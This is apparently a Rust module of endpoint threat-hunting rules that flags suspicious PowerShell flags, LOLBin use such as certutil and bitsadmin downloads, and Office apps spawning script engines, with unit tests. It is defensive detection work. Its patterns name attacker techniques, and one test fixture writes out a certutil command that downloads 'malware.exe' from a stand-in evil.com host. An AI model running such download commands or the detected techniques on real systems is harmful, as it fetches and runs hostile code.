use crate::database::{HuntMatch, ProcessEvent};
use chrono::Utc;

/// Check for suspicious PowerShell usage patterns
pub fn check_suspicious_powershell(event: &ProcessEvent) -> Option<HuntMatch> {
    let image_lower = event.image_path.to_lowercase();
    let cmdline_lower = event.command_line.to_lowercase();

    // Check if this is PowerShell
    if !image_lower.contains("powershell.exe") && !image_lower.contains("pwsh.exe") {
        return None;
    }

    let mut suspicions = Vec::new();

    // Check for encoded commands
    if cmdline_lower.contains("-enc") || cmdline_lower.contains("-encodedcommand") {
        suspicions.push("encoded command (-enc/-encodedcommand)");
    }

    // Check for download cradles
    if cmdline_lower.contains("downloadstring") {
        suspicions.push("DownloadString (download cradle)");
    }

    if cmdline_lower.contains("iex") || cmdline_lower.contains("invoke-expression") {
        suspicions.push("Invoke-Expression (IEX)");
    }

    // Check for hidden window
    if cmdline_lower.contains("-w hidden") || cmdline_lower.contains("-windowstyle hidden") {
        suspicions.push("hidden window (-WindowStyle Hidden)");
    }

    // Check for bypass execution policy
    if cmdline_lower.contains("-ep bypass") || cmdline_lower.contains("-executionpolicy bypass") {
        suspicions.push("execution policy bypass");
    }

    // Check for no profile
    if cmdline_lower.contains("-nop") || cmdline_lower.contains("-noprofile") {
        suspicions.push("no profile (-NoProfile)");
    }

    if !suspicions.is_empty() {
        let description = format!(
            "Suspicious PowerShell detected: {} - Command: {}",
            suspicions.join(", "),
            event.command_line
        );

        return Some(HuntMatch {
            id: None,
            timestamp: Utc::now(),
            rule_name: "suspicious-powershell".to_string(),
            event_type: "process".to_string(),
            event_id: event.id.unwrap_or(0),
            description,
        });
    }

    None
}

/// Check for Living Off The Land Binaries (LOLBins)
pub fn check_lolbins(event: &ProcessEvent) -> Option<HuntMatch> {
    let image_lower = event.image_path.to_lowercase();
    let cmdline_lower = event.command_line.to_lowercase();

    let lolbins = [
        ("rundll32.exe", "DLL execution utility"),
        ("regsvr32.exe", "COM registration utility"),
        ("mshta.exe", "HTML Application host"),
        ("wmic.exe", "Windows Management Instrumentation"),
        ("bitsadmin.exe", "Background transfer utility"),
        ("certutil.exe", "Certificate utility"),
        ("msiexec.exe", "Windows Installer"),
        ("cscript.exe", "Windows Script Host"),
        ("wscript.exe", "Windows Script Host"),
        ("regasm.exe", ".NET registration utility"),
        ("regsvcs.exe", ".NET registration utility"),
        ("installutil.exe", ".NET installer utility"),
    ];

    for (lolbin, description) in lolbins {
        if image_lower.contains(lolbin) {
            // Additional checks for more suspicious usage
            let mut suspicions = vec![format!("LOLBin: {} ({})", lolbin, description)];

            // Check for suspicious arguments
            if lolbin == "rundll32.exe" {
                if cmdline_lower.contains("javascript:")
                    || cmdline_lower.contains("http://")
                    || cmdline_lower.contains("https://")
                {
                    suspicions.push("suspicious arguments (URL/JavaScript)".to_string());
                }
            }

            if lolbin == "certutil.exe" {
                if cmdline_lower.contains("-urlcache")
                    || cmdline_lower.contains("-decode")
                    || cmdline_lower.contains("-decodehex")
                {
                    suspicions.push("download/decode operation".to_string());
                }
            }

            if lolbin == "bitsadmin.exe" {
                if cmdline_lower.contains("/transfer") || cmdline_lower.contains("/download") {
                    suspicions.push("file transfer operation".to_string());
                }
            }

            let desc = format!(
                "LOLBin detected: {} - Command: {}",
                suspicions.join(", "),
                event.command_line
            );

            return Some(HuntMatch {
                id: None,
                timestamp: Utc::now(),
                rule_name: "lolbins".to_string(),
                event_type: "process".to_string(),
                event_id: event.id.unwrap_or(0),
                description: desc,
            });
        }
    }

    None
}

/// Check for suspicious parent-child process relationships
pub fn check_suspicious_parent_child(parent: &ProcessEvent, child: &ProcessEvent) -> Option<HuntMatch> {
    let parent_image = parent.image_path.to_lowercase();
    let child_image = child.image_path.to_lowercase();

    // Office applications spawning scripting engines
    let office_apps = [
        "winword.exe",
        "excel.exe",
        "powerpnt.exe",
        "outlook.exe",
        "msaccess.exe",
    ];

    let suspicious_children = [
        "powershell.exe",
        "pwsh.exe",
        "cmd.exe",
        "wscript.exe",
        "cscript.exe",
        "mshta.exe",
        "regsvr32.exe",
        "rundll32.exe",
    ];

    for office_app in office_apps {
        if parent_image.contains(office_app) {
            for suspicious_child in suspicious_children {
                if child_image.contains(suspicious_child) {
                    let description = format!(
                        "Suspicious parent-child relationship: {} spawned {} - Child command: {}",
                        office_app, suspicious_child, child.command_line
                    );

                    return Some(HuntMatch {
                        id: None,
                        timestamp: Utc::now(),
                        rule_name: "suspicious-parent-child".to_string(),
                        event_type: "process".to_string(),
                        event_id: child.id.unwrap_or(0),
                        description,
                    });
                }
            }
        }
    }

    // Explorer spawning unusual processes
    if parent_image.contains("explorer.exe") {
        let unusual_children = ["psexec.exe", "procdump.exe", "mimikatz.exe"];

        for unusual_child in unusual_children {
            if child_image.contains(unusual_child) {
                let description = format!(
                    "Unusual process spawned by explorer.exe: {} - Command: {}",
                    unusual_child, child.command_line
                );

                return Some(HuntMatch {
                    id: None,
                    timestamp: Utc::now(),
                    rule_name: "suspicious-parent-child".to_string(),
                    event_type: "process".to_string(),
                    event_id: child.id.unwrap_or(0),
                    description,
                });
            }
        }
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_suspicious_powershell_encoded() {
        let event = ProcessEvent {
            id: Some(1),
            timestamp: Utc::now(),
            pid: 1234,
            parent_pid: 5678,
            image_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string(),
            command_line: "powershell.exe -enc SGVsbG8gV29ybGQ=".to_string(),
            username: "testuser".to_string(),
        };

        let result = check_suspicious_powershell(&event);
        assert!(result.is_some());
        let hunt_match = result.unwrap();
        assert_eq!(hunt_match.rule_name, "suspicious-powershell");
        assert!(hunt_match.description.contains("encoded command"));
    }

    #[test]
    fn test_lolbin_certutil() {
        let event = ProcessEvent {
            id: Some(2),
            timestamp: Utc::now(),
            pid: 2345,
            parent_pid: 6789,
            image_path: "C:\\Windows\\System32\\certutil.exe".to_string(),
            command_line: "certutil.exe -urlcache -split -f http://evil.com/malware.exe".to_string(),
            username: "testuser".to_string(),
        };

        let result = check_lolbins(&event);
        assert!(result.is_some());
        let hunt_match = result.unwrap();
        assert_eq!(hunt_match.rule_name, "lolbins");
        assert!(hunt_match.description.contains("certutil.exe"));
    }

    #[test]
    fn test_suspicious_parent_child_office() {
        let parent = ProcessEvent {
            id: Some(3),
            timestamp: Utc::now(),
            pid: 3456,
            parent_pid: 7890,
            image_path: "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE".to_string(),
            command_line: "WINWORD.EXE document.docx".to_string(),
            username: "testuser".to_string(),
        };

        let child = ProcessEvent {
            id: Some(4),
            timestamp: Utc::now(),
            pid: 4567,
            parent_pid: 3456,
            image_path: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe".to_string(),
            command_line: "powershell.exe -w hidden -enc SGVsbG8=".to_string(),
            username: "testuser".to_string(),
        };

        let result = check_suspicious_parent_child(&parent, &child);
        assert!(result.is_some());
        let hunt_match = result.unwrap();
        assert_eq!(hunt_match.rule_name, "suspicious-parent-child");
        assert!(hunt_match.description.contains("winword.exe"));
        assert!(hunt_match.description.contains("powershell.exe"));
    }
}
